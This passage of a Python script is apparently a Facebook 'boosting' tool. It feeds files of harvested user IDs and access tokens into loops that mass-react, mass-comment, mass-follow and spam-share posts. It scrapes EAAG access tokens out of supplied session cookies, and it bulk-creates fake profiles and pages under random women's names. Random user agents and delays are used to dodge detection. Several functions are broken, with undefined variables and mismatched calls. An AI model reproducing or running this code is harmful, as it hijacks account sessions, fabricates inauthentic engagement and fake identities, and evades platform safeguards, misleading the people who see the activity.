    data = {'access_token':token,'method':'post','pretty':False,'format':'json','server_timestamps':True,'locale':'id_ID','fb_api_req_friendly_name':'ViewerReactionsMutation','fb_api_caller_class':'graphservice','client_doc_id':'2857784093518205785115255697','variables':json.dumps(var),'fb_api_analytics_tags':["GraphServices"],'client_trace_id':str(uuid.uuid4())}
    pos  = rui.post('https://graph.facebook.com/graphql', data=data).json()
    try:
        if react in str(pos): print(f"{GREEN}SUCCESSFULLY REACTS : {actor_id} TO {post_id} ")
        else: print(f"{red}FAILED REACTS : {actor_id} TO {post_id} ")
    except Exception: print('')

def choose_reaction():
    clearr()
    linex()
    print(f"{WHITE}「1」LIKE")
    print(f"{WHITE}「2」LOVE")
    print(f"{WHITE}「3」HAHA")
    print(f"{WHITE}「4」WOW")
    print(f"{WHITE}「5」CARE")
    print(f"{WHITE}「6」SAD")
    print(f"{WHITE}「7」ANGRY")
    linex()
    rec = input(f'{WHITE}「Choose」 : ')
    reactions = {
        '1': '1635855486666999',  # LIKE
        '2': '1678524932434102',  # LOVE
        '3': '115940658764963',   # HAHA
        '4': '478547315650144',   # WOW
        '5': '613557422527858',   # CARE
        '6': '908563459236466',   # SAD
        '7': '444813342392137'    # ANGRY
    }
    return reactions.get(rec, None)

def quickreact():
    def get_ids_tokens(file_path):
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    clearr()
    actor_ids = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/tokaid.txt')
    tokens = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
    post_link = input('ENTER THE FACEBOOK POST LINK : ')
    post_id = linktradio(post_link)
    react = choose_reaction()
    if react:
        for actor_id, token in zip(actor_ids, tokens):
            Reaction(actor_id=actor_id, post_id=post_id, react=react, token=token)
    else:
        print('INVALID OPTION.')

gome_token = []

def tokz(input_cookies):
    for cookie in input_cookies:
        header_ = {
            'authority': 'business.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'cache-control': 'max-age=0',
            'cookie': cookie,
            'referer': 'https://www.facebook.com/',
            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        try:
            home_business = requests.get('https://business.facebook.com/content_management', headers=header_).text
            token = home_business.split('EAAG')[1].split('","')[0]
            cookie_token = f'{cookie}|EAAG{token}'
            gome_token.append(cookie_token)
        except:
            pass
    return gome_token

def share(tach, id_share):
    cookie = tach.split('|')[0]
    token = tach.split('|')[1]
    he = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'connection': 'keep-alive',
        'content-length': '0',
        'cookie': cookie,
        'host': 'graph.facebook.com'
    }
    try:
        res = requests.post(f'https://graph.facebook.com/me/feed?link=https://m.facebook.com/{id_share}&published=0&access_token={token}', headers=he).json()
    except:
        pass
    
def spam_share_post():
    clearr()
    input_cookies = input("ENTER COOKIE : ").split(',')
    id_share = input("FB LINK ID POST SHARE : ")
    total_share = int(input("TOTAL SHARE FB POST : "))
    delay = int(input("DELAY SHARE : "))
    linex()
    print(f'WAIT...', end='\r')
    all = tokz(input_cookies)
    total_live = len(all)
    if total_live == 0:
        sys.exit()
    stt = 0
    while True:
        for tach in all:
            stt = stt + 1
            threa = threading.Thread(target=share, args=(tach, id_share))
            threa.start()
            print(f'{GREEN}SUCCESSFULLY ID : {stt}  ')
            time.sleep(delay)
        if stt > total_share:
            break
    gome_token.clear()
    input('PRESS ENTER TO BACK')

def spam_share():
    clearr()
    input_cookie = input('ENTER THE COOKIE : ')
    share_url = input('ENTER THE FACEBOOK POST LINK : ')
    clearr()
    share_count = 22200
    time_interval = 1.5
    delete_after = 60 * 60
    shared_count = 0
    timer = None
    headers = {
        'authority': 'graph.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'
}
    def share_post():
        nonlocal shared_count, timer
        try:
            response = requests.post(
                f'https://graph.facebook.com/me/feed?input_cookie={input_cookie}&fields=id&limit=1&published=0',
                json={
                    'link': share_url,
                    'privacy': {'value': 'SELF'},
                    'no_story': True,
                },
                headers=headers
            )
            shared_count += 1
            post_id = response.json().get('id')
            print(f'{GREEN}SUCCESSFULLY ID : {shared_count} {post_id or "id"}')
            if shared_count == share_count:
                timer.cancel()
                print('FINISHED SHARING POSTS.')
                if post_id:
                    threading.Timer(delete_after, delete_post, args=(post_id,)).start()
        except requests.exceptions.RequestException as error:
            print('FAILED TO SHARE POST:', error.response.json() if error.response else str(error))

    def delete_post(post_id):
        try:
            requests.delete(f'https://graph.facebook.com/{post_id}?access_token={access_token}')
            print(f'POST DELETED: {post_id}')
        except requests.exceptions.RequestException as error:
            print('FAILED TO DELETE POST:', error.response.json() if error.response else str(error))
    def start_sharing():
        nonlocal timer
        timer = threading.Timer(time_interval, share_post)
        timer.start()
    for _ in range(share_count):
        start_sharing()
        time.sleep(time_interval)
    time.sleep(share_count * time_interval)
    if timer:
        timer.cancel()
        print('LOOP STOPPED.')

def get_ids_tokens(file_path):
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]

def linktradio(post_link):
    try:
        if 'photo.php?fbid=' in post_link:
            post_id = post_link.split('fbid=')[1].split('&')[0]
        elif '/posts/' in post_link:
            post_id = post_link.split('/posts/')[1].split('/')[0]
        else:
            print("INVALID POST LINK.")
            return None
        return post_id
    except IndexError:
        print("COULD NOT EXTRACT POST ID.")
        return None

def auto_comments():
    clearr()
    user_ids = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/tokaid.txt')
    access_tokens = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
    current_time = datetime.now()
    user_name = get_user_name()
    post_link = input('ENTER THE FACEBOOK POST LINK : ')
    post_id = linktradio(post_link)
    comment_text = input('ENTER THE COMMENT TEXT (OR LEAVE BLANK FOR AUTO COMMENT): ')
    num_comments = int(input('ENTER THE NUMBER OF COMMENTS TO MAKE: '))
    if not comment_text:
        current_time = datetime.now().strftime("%I:%M %p")
        current_date = datetime.now().strftime("%Y-%m-%d")
        comment_text = f'TIME: {current_time} {current_date} \n AUTO COMMENT BY {user_name}'

    def has_commented(post_id, access_token, user_id):
        try:
            url = f'https://graph.facebook.com/v18.0/{user_id}_{post_id}/comments'
            params = {'access_token': access_token}
            response = requests.get(url, params=params)
            response.raise_for_status()
            comments = response.json().get('data', [])
            for comment in comments:
                if comment.get('from', {}).get('id') == user_id:
                    return True
        except requests.exceptions.RequestException as error:
            print(f"{red}FAILED TO COMMENT ON {post_id}")
        return False
    comments_count = 0
    user_count = len(user_ids)
    for _ in range(num_comments):
        for i in range(user_count):
            user_id = user_ids[i]
            access_token = access_tokens[i]
            try:
                if not has_commented(post_id, access_token, user_id):
                    url = f'https://graph.facebook.com/v19.0/{user_id}_{post_id}/comments'
                    params = {'access_token': access_token, 'message': comment_text}
                    response = requests.post(url, params=params)
                    if response.status_code == 200:
                        comments_count += 1
                        print(f"{GREEN}SUCCESSFULLY COMMENTED ON {w} {post_id}")
                        if comments_count >= num_comments:
                            print(f"{GREEN}SUCCESSFULLY COMMENTED {w} {num_comments} {w}TIMES.")
                            return
                    else:
                        print(f"{red}FAILED TO COMMENT ON {post_id}")
            except requests.exceptions.RequestException as error:
                print(f"{red}FAILED TO COMMENT ON {post_id}")
        current_comment_index += 1
    print(f"{GREEN}TOTAL SUCCESSFULLY COMMENTS: {successful_comments}")

class reg_pro5():
    def __init__(self,cookies, name) -> None:
        self.cookies = cookies
        self.id_acc = self.cookies.split('c_user=')[1].split(';')[0]
        headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'vi',
            'cookie': self.cookies,
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'viewport-width': '980',
        }
        url_profile = requests.get('https://www.facebook.com/me', headers=headers).url
        profile = requests.get(url_profile, headers=headers).text
        try:
            self.fb_dtsg = profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
        except:
            self.fb_dtsg = profile.split(',"f":"')[1].split('","l":null}')[0]
    def Reg(self):
        headers = {
            'authority': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'cookie': self.cookies,
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/pages/creation?ref_type=launch_point',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'viewport-width': '980',
            'x-fb-friendly-name': 'AdditionalProfilePlusCreationMutation',
            'x-fb-lsd': 'ZM7FAk6cuRcUp3imwqvHTY',
        }
        data = {
            'av': self.id_acc,
            '__user': self.id_acc,
            '__a': '1',
            '__dyn': '7AzHxq1mxu1syUbFuC0BVU98nwgU29zEdEc8co5S3O2S7o11Ue8hw6vwb-q7oc81xoswIwuo886C11xmfz81sbzoaEnxO0Bo7O2l2Utwwwi831wiEjwZwlo5qfK6E7e58jwGzE8FU5e7oqBwJK2W5olwuEjUlDw-wUws9ovUaU3qxWm2Sq2-azo2NwkQ0z8c84K2e3u362-2B0oobo',
            '__csr': 'gP4ZAN2d-hbbRmLObkZO8LvRcXWVvth9d9GGXKSiLCqqr9qEzGTozAXiCgyBhbHrRG8VkQm8GFAfy94bJ7xeufz8jK8yGVVEgx-7oiwxypqCwgF88rzKV8y2O4ocUak4UpDxu3x1K4opAUrwGx63J0Lw-wa90eG18wkE7y14w4hw6Bw2-o069W00CSE0PW06aU02Z3wjU6i0btw3TE1wE5u',
            '__req': 't',
            '__hs': '19296.HYP:comet_pkg.2.1.0.2.1',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1006496476',
            '__s': '1gapab:y4xv3f:2hb4os',
            '__hsi': '7160573037096492689',
            '__comet_req': '15',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': '25404',
            'lsd': 'ZM7FAk6cuRcUp3imwqvHTY',
            '__aaid': '800444344545377',
            '__spin_r': '1006496476',
            '__spin_b': 'trunk',
            '__spin_t': '1667200829',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'AdditionalProfilePlusCreationMutation',
            'variables': '{"input":{"bio":"","categories":["181475575221097"],"creation_source":"comet","name":"'+name+'","page_referrer":"launch_point","actor_id":"'+self.id_acc+'","client_mutation_id":"1"}}',
            'server_timestamps': 'true',
            'doc_id': '5903223909690825',
        }
        response = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data).json()
        try:
            return response['data']['additional_profile_plus_create']['additional_profile']['id']
        except:
                return (f'{red}FAILED CREATE PAGE')

def create_page():
        clearr()
        dem = 0
        ck=[]
        xd = input("{WHITE}FILE LOCATION : ")
        first = input("{WHITE}FIRST NAME : ")
        middle = input("{WHITE}MIDDLE NAME : ")
        last = input("{WHITE}LAST NAME : ")
        clear()
        for i in open(xd).read().splitlines():
        	 ck.append(i.split("|")[0])
        dl = input('{WHITE}HOW MANY CREATE PAGES : ')
        def delay(dl):
        	t=datetime.now().strftime("%H:%M")
        	for ti in range(int(dl) , 0, -1):
        	      print(f'\r{GREEN}TASK START > {ti} < ARTHUR ',end='\r')
        	sleep(0.10)
        for cookies in ck:
        	arthur = (first)
        	arthur1 = (middle)
        	arthur2 = (last)
        	name = str(arthur+' '+arthur1+' '+arthur2)
        	dem = dem+1
        	try:print(dem,reg_pro5(cookies, name).Reg())
        	except:pass
        	delay(dl);menu()

init(autoreset=True)

class reg_pro6():
    def __init__(self, cookies, name) -> None:
        self.cookies = cookies
        self.name = name
        self.id_acc = self.cookies.split('c_user=')[1].split(';')[0]
        headers = self.get_headers()
        url_profile = requests.get('https://www.facebook.com/me', headers=headers).url
        profile = requests.get(url_profile, headers=headers).text
        try:
            self.fb_dtsg = profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
        except:
            self.fb_dtsg = profile.split(',"f":"')[1].split('","l":null}')[0]

    def get_headers(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
        ]
        headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': self.cookies,
            'sec-ch-prefers-color-scheme': 'light',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': random.choice(user_agents),
            'viewport-width': str(random.randint(800, 1920)),
        }
        return headers

    def random_delay(self, min_time=2, max_time=5):
        time.sleep(random.uniform(min_time, max_time))

    def create_profile(self):
        headers = self.get_headers()
        self.random_delay()
        data = {
            'av': self.id_acc,
            '__user': self.id_acc,
            '__a': '1',
            '__dyn': '7AzHxq1mxu1syUbFuC0BVU98nwgU29zEdEc8co5S3O2S7o11Ue8hw6vwb-q7oc81xoswIwuo886C11xmfz81sbzoaEnxO0Bo7O2l2Utwwwi831wiEjwZwlo5qfK6E7e58jwGzE8FU5e7oqBwJK2W5olwuEjUlDw-wUws9ovUaU3qxWm2Sq2-azo2NwkQ0z8c84K2e3u362-2B0oobo',
            '__csr': 'gP4ZAN2d-hbbRmLObkZO8LvRcXWVvth9d9GGXKSiLCqqr9qEzGTozAXiCgyBhbHrRG8VkQm8GFAfy94bJ7xeufz8jK8yGVVEgx-7oiwxypqCwgF88rzKV8y2O4ocUak4UpDxu3x1K4opAUrwGx63J0Lw-wa90eG18wkE7y14w4hw6Bw2-o069W00CSE0PW06aU02Z3wjU6i0btw3TE1wE5u',
            '__req': 't',
            '__hs': '19296.HYP:comet_pkg.2.1.0.2.1',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1006496476',
            '__s': '1gapab:y4xv3f:2hb4os',
            '__hsi': '7160573037096492689',
            '__comet_req': '15',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': '25404',
            'lsd': 'ZM7FAk6cuRcUp3imwqvHTY',
            '__aaid': '800444344545377',
            '__spin_r': '1006496476',
            '__spin_b': 'trunk',
            '__spin_t': '1667200829',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'AdditionalProfilePlusCreationMutation',
            'variables': '{"input":{"bio":"","categories":["181475575221097"],"creation_source":"comet","name":"'+self.name+'","page_referrer":"launch_point","actor_id":"'+self.id_acc+'","client_mutation_id":"1"}}',
            'server_timestamps': 'true',
            'doc_id': '5903223909690825',
        }
        self.random_delay()
        response = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data).json()
        try:
            profile_id = response['data']['additional_profile_plus_create']['additional_profile']['id']
            print(Fore.GREEN + "SUCCESSFULLY CREATED PROFILE")
            print(Fore.GREEN + f"PROFILE NAME: {self.name}")
            print(Fore.GREEN + f"PROFILE ID: {profile_id}")
        except:
            print(Fore.RED + 'FAILED CREATE PAGE.')

class reg_pro7():
    def __init__(self, cookies, name) -> None:
        self.cookies = cookies
        self.name = name
        self.id_acc = self.cookies.split('c_user=')[1].split(';')[0]
        headers = self.get_headers()
        url_profile = requests.get('https://www.facebook.com/me', headers=headers).url
        profile = requests.get(url_profile, headers=headers).text
        try:
            self.fb_dtsg = profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
        except:
            self.fb_dtsg = profile.split(',"f":"')[1].split('","l":null}')[0]

    def get_headers(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
        ]
        headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': self.cookies,
            'sec-ch-prefers-color-scheme': 'light',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': random.choice(user_agents),
            'viewport-width': str(random.randint(800, 1920)),
        }
        return headers

    def random_delay(self, min_time=2, max_time=5):
        time.sleep(random.uniform(min_time, max_time))

    def create_profile(self):
        headers = self.get_headers()
        self.random_delay()
        data = {
            'av': self.id_acc,
            '__user': self.id_acc,
            '__a': '1',
            '__dyn': '7AzHxq1mxu1syUbFuC0BVU98nwgU29zEdEc8co5S3O2S7o11Ue8hw6vwb-q7oc81xoswIwuo886C11xmfz81sbzoaEnxO0Bo7O2l2Utwwwi831wiEjwZwlo5qfK6E7e58jwGzE8FU5e7oqBwJK2W5olwuEjUlDw-wUws9ovUaU3qxWm2Sq2-azo2NwkQ0z8c84K2e3u362-2B0oobo',
            '__csr': 'gP4ZAN2d-hbbRmLObkZO8LvRcXWVvth9d9GGXKSiLCqqr9qEzGTozAXiCgyBhbHrRG8VkQm8GFAfy94bJ7xeufz8jK8yGVVEgx-7oiwxypqCwgF88rzKV8y2O4ocUak4UpDxu3x1K4opAUrwGx63J0Lw-wa90eG18wkE7y14w4hw6Bw2-o069W00CSE0PW06aU02Z3wjU6i0btw3TE1wE5u',
            '__req': 't',
            '__hs': '19296.HYP:comet_pkg.2.1.0.2.1',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1006496476',
            '__s': '1gapab:y4xv3f:2hb4os',
            '__hsi': '7160573037096492689',
            '__comet_req': '15',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': '25404',
            'lsd': 'ZM7FAk6cuRcUp3imwqvHTY',
            '__aaid': '800444344545377',
            '__spin_r': '1006496476',
            '__spin_b': 'trunk',
            '__spin_t': '1667200829',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'AdditionalProfilePlusCreationMutation',
            'variables': '{"input":{"bio":"","categories":["181475575221097"],"creation_source":"comet","name":"'+self.name+'","page_referrer":"launch_point","actor_id":"'+self.id_acc+'","client_mutation_id":"1"}}',
            'server_timestamps': 'true',
            'doc_id': '5903223909690825',
        }
        self.random_delay()
        response = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data).json()
        try:
            result = response.json()
            if 'id' in result:
                page_id = result['id']
                self.set_profile_picture(page_id)
            return result
        except:
            return response.text

    def set_profile_picture(self, page_id):
        picture_path = "/home/spade/Desktop/load data/Profile.jpeg"  # Replace with your actual path to the profile picture
        headers = {
            'authority': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'cookie': self.cookies,
            'origin': 'https://www.facebook.com',
            'referer': f'https://www.facebook.com/{page_id}',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'viewport-width': '979',
            'x-fb-friendly-name': 'ProfilePicUpload',
            'x-fb-lsd': 'ZM7FAk6cuRcUp3imwqvHTY',
        }
        files = {
            'source': (os.path.basename(picture_path), open(picture_path, 'rb'), 'image/jpeg')
        }
        data = {
            'av': self.id_acc,
            '__user': self.id_acc,
            'profile_id': page_id,
            'fb_dtsg': self.fb_dtsg,
            'photo_source': '4',
            'composer_entry_time': '0',
            'composer_session_id': 'abc',
            'ref': 'timeline',
            'upload_id': 'profile_pic',
            'upload_type': 'profile',
        }
        response = requests.post('https://www.facebook.com/photos/upload', headers=headers, files=files, data=data)
        try:
            return response.json()
        except:
            return response.text

def kolor(text, color):
    if color == 'green':
        print(Fore.GREEN + text + Style.RESET_ALL)
    elif color == 'red':
        print(Fore.RED + text + Style.RESET_ALL)
    else:
        print(text)

def page_create2():
    clearr()
    cookies_file = input(f'{WHITE}PUT FILE PATH : ')
    with open(cookies_file, 'r') as f:
        cookies_list = f.readlines()
    for cookie_line in cookies_list:
        cookie_line = cookie_line.strip()  
        cookies = cookie_line
        vietnamese_names = ['Maria Santos','Isabel Reyes','Ana Cruz','Liza Mendoza','Kristine Garcia','Lourdes Aquino','Angelica Morales','Sofia Rivera','Carla Fernandez','Elena Lopez','Gabriela Torres','Jane Castillo','Teresa Ramos','Pauline Navarro','Ruby Delgado','Andrea Villanueva','Bianca Santos','Jessica Ortega','Celeste Bautista','Marjorie Flores',
        'Rosa Alvarez','Nina Hernandez','Margarita Dela Cruz','Lourdes Panganiban','Carmen Salazar','Janine Lim','Felicity Mercado','Diana Garcia','Maria Clara Santos','Amelia Mendoza','Regina Cruz','Sylvia Bautista','Patricia Moreno','Janelle Reyes','Edith Lopez','Mia Vargas','Nora Santiago','Elena Villanueva','Samantha Cruz','Cheryl Aquino',
        'Lorena Santos','Gina Rodriguez','Mia Fernandez','Elena Morales','Jessica Santos','Rina Castillo','Lani Cruz','Vicky Reyes','Marian Lopez','Judy Garcia','Rhea Rivera','Claudia Alvarez','Glydel Mendoza','Nadine Torres','Marissa Aquino','Ruby Dela Cruz','Nina Santos','Katrina Panganiban','Marlene Fernandez','Sheryl Ortega',
        'Chloe Santos','Melissa Reyes','Irene Cruz','Nora Mendoza','Trina Garcia','Daphne Lopez','Rochelle Dela Cruz','Nina Aquino','Mariel Torres','Jasmine Villanueva','Ella Ramos','Angela Mercado','Nadia Fernandez','Ivy Castillo','Melanie Rivera','Rita Aquino','Karen Santos','Megan Reyes','Liza Panganiban','Therese Garcia',
        'Rina Santos','Diana Mendoza','Samantha Reyes','Cynthia Lopez','Margarita Garcia','Ellaine Torres','Hannah Villanueva','Rochelle Ramirez','Nina Alvarez','Joyce Panganiban','Grace Dela Cruz','Lynette Morales','Marina Rivera','Kathleen Santos','Liza Morales','Tina Fernandez','Angela Aquino','Bea Ramos','Carmen Lopez','Paula Navarro',
        'Veronica Santos','Annie Castillo','Lorena Reyes','Nadia Fernandez','Janelle Cruz','Daisy Mendoza','Carmen Aquino','Joyce Rivera','Liza Navarro','Rita Santos','Mia Ramos','Elaine Lopez','Rachel Garcia','Patricia Santos','Yvette Dela Cruz','Marlene Castillo','Sylvia Reyes','Janice Morales','Vera Torres','Wendy Aquino',
        'Aileen Santos','Giselle Mendoza','Nina Rodriguez','Lorna Reyes','Eleanor Cruz','Vicky Delgado','Renee Alvarez','Marissa Garcia','Tina Navarro','Jasmine Lopez','Carla Panganiban','Nora Santiago','Hazel Torres','Fiona Ramos','Lyn Villanueva','Marilyn Dela Cruz','Ruby Aquino','Celina Mercado','Diana Santiago','Joyce Villanueva',
        'Marlene Santos','Aileen Reyes','Teresa Mendoza','Esther Cruz','Rita Bautista','Helen Torres','Evelyn Morales','Irene Navarro','Marissa Villanueva','Janice Aquino','Linda Fernandez','Belinda Garcia','Clarissa Reyes','Nora Dela Cruz','Lydia Mendoza','Gilda Cruz','Melanie Santos','Diana Reyes','Rosalinda Lopez','Yolanda Fernandez',
        'Jovita Santos','Nancy Reyes','Viola Cruz','Hilda Bautista','Lourdes Torres','Nina Morales','Marlene Navarro','Ginger Villanueva','Rosa Aquino','Imelda Fernandez','Anita Garcia','Connie Reyes','Mabel Dela Cruz','Dolores Mendoza','Pilar Cruz','Cecilia Santos','Sonia Reyes','Nida Lopez','Rosie Fernandez','Fely Aquino',] 
        random_name = random.choice(vietnamese_names)
        reg_instance = reg_pro7(cookies)
        result = reg_instance.reg(random_name)
        if 'error' not in result:
            kolor("SUCCESSFULLY CREATED PAGE", 'green')
        else:
            kolor("UNSUCCESSFULLY CREATED PAGE", 'red')
            print(result)

def create_page1():
    clearr()
    linex()
    print(f"{WHITE}「1」CREATE A NEW FACEBOOK PROFILE")
    print(f"{WHITE}「2」CREATE A NEW VIETNAMESE GIRL")
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
        page_create()
    if me == '2':
        page_create2()
    else:
        print(f'{red}INVALID OPTION.')

def page_create():
    clearr()
    cookies = input(Fore.GREEN + "ENTER YOUR FACEBOOK COOKIES: ")
    name = input("ENTER THE NAME FOR THE NEW PROFILE: ")
    profile_creator = reg_pro6(cookies, name)
    profile_creator.create_profile()

def follow():
    clearr()
    linex()
    print(f"{WHITE}「1」FOLLOW")
    print(f"{WHITE}「2」REMOVE FOLLOW")
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
        follow_facebook_profile()
    elif me == '2':
    	remove_facebook_follower()
    else:
        print(f'{red}INVALID OPTION.')

def get_profile_id(profile_link, access_token):
    if profile_link.isdigit():
        return profile_link
    url = f'https://graph.facebook.com/v19.0/{profile_link}'
    params = {'access_token': access_token, 'fields': 'id'}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        return response.json().get('id', 'Unknown ID')
    return 'Unknown ID'

def get_profile_username(profile_id, access_token):
    url = f'https://graph.facebook.com/v19.0/{profile_id}'
    params = {'access_token': access_token, 'fields': 'name'}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        return response.json().get('name', 'Unknown Profile')
    return 'Unknown Profile'

def follow_facebook_profile():
    clearr()
    access_tokens = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
    profile_link = input('ENTER THE FACEBOOK PROFILE LINK : ')
    profile_id = get_profile_id(profile_link.split('/')[-1], access_tokens[0])
    num_followers = int(input('HOW MANY FOLLOWERS DO YOU WANT TO ADD? '))

    def follow_profile(profile_id, access_token):
        try:
            url = f'https://graph.facebook.com/v19.0/{profile_id}/subscribers'
            params = {'access_token': access_token}
            response = requests.post(url, params=params)
            if response.status_code == 200:
                return True
            return False
        except requests.exceptions.RequestException:
            return False
    follow_count = 0
    for i, access_token in enumerate(access_tokens):
        if follow_count >= num_followers:
            break
        profile_name = get_profile_username(profile_id, access_token)
        if follow_profile(profile_id, access_token):
            print(f"{GREEN}SUCCESSFULLY : FOLLOWED THE PROFILE '{profile_name}' WITH ID {i + 1}")
            follow_count += 1
        else:
            print(f"{red}FAILED : COULD NOT FOLLOW THE PROFILE '{profile_name}' WITH ID {i + 1}")
    print(f"{GREEN}SUCCESSFULLY : FOLLOWED {follow_count} PROFILES OUT OF {num_followers} REQUESTED.")

def remove_facebook_follower():
    clear()
    access_tokens = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
    profile_link = input('ENTER THE FACEBOOK PROFILE LINK TO REMOVE : ')
    profile_id = get_profile_id(profile_link.split('/')[-1], access_tokens[0])
    def remove_follower(profile_id, access_token):
        try:
            url = f'https://graph.facebook.com/v19.0/{profile_id}/subscribers'
            params = {'access_token': access_token}
            response = requests.delete(url, params=params)
            if response.status_code == 200:
                return True
            return False
        except requests.exceptions.RequestException:
            return False
    remove_count = 0
    for i, access_token in enumerate(access_tokens):
